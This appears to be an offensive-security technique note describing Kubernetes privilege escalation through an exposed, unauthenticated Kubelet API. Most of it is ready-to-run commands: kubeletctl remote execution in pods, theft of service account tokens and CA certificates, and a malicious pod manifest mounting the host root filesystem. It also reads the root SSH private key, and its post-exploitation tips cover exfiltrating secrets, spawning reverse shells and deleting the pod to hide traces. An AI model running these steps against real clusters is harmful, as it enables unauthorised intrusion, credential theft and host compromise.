### 1. Technique Name:

Kubernetes – Exploiting Kubelet and API Misconfigurations for Privilege Escalation
### 2. Summary:

Kubernetes (K8s) is a powerful open-source container orchestration platform that simplifies deployment, scaling, and management of containerized applications. However, when misconfigured, especially in real-world enterprise deployments or CTF-like environments, it can lead to privilege escalation paths. This technique focuses on enumerating accessible pods via the Kubelet API, extracting sensitive credentials, and creating privileged containers to mount the host’s root filesystem.
### 3. Conditions / Requirements:

- Access to an exposed Kubernetes environment    
- Accessible and unauthenticated (or weakly authenticated) Kubelet API (`port 10250`)
- Ability to query or interact with the Kubernetes API server (`port 6443`)
- A pod running with service account tokens readable from `/var/run/secrets/...`
- Permissions to list/create pods using the stolen token
- `kubeletctl` binary (optional, for convenience)
### 4. Enumeration Steps:
#### A. Identify Kubelet and API server:

```bash
# Detect Kubernetes API Server
curl -k https://<target-ip>:6443

# Detect Kubelet API (no auth)
curl -k https://<target-ip>:10250/pods
```
#### B. Install and use kubeletctl:

```bash
kubeletctl -i --server <target-ip> pods
```
#### C. Scan for RCE support:

```bash
kubeletctl -i --server <target-ip> scan rce
```
#### D. Interact with vulnerable pod:

```bash
kubeletctl -i --server <target-ip> exec "id" -p <pod-name> -c <container-name>
```
#### E. Extract service account token and certificate:

```bash
kubeletctl -i --server <target-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> > k8.token

kubeletctl --server <target-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container> > ca.crt
```
### 5. Exploitation Steps:
#### A. Use extracted token to list permissions:

```bash
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 auth can-i --list
```
#### B. Prepare a malicious pod manifest (`privesc.yaml`) to mount host root (`/`) into container:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
#### C. Create the pod:

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 apply -f privesc.yaml
```
#### D. Verify and interact:

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 get pods
kubeletctl --server <target-ip> exec "id" -p privesc -c privesc
```
#### E. Extract sensitive host data (e.g., root SSH key):

```bash
kubeletctl --server <target-ip> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
### 6. Post-Exploitation Tips:

- Exfiltrate secrets or SSH keys    
- Use mounted `/root` path to dump other credentials or files
- Spawn reverse shells from within privileged pod
- Cleanup malicious pod to reduce footprint:

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<api-server-ip>:6443 delete pod privesc
```
### 7. Example / Notes:

- Example of vulnerable unauthenticated access:    

```bash
curl https://<ip>:10250/pods -k | jq .
```

- Example kubeletctl usage:

```bash
kubeletctl -i --server <ip> exec "id" -p nginx -c nginx
```

- Example token extraction:

```bash
kubeletctl -i --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx > k8.token
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Kubernetes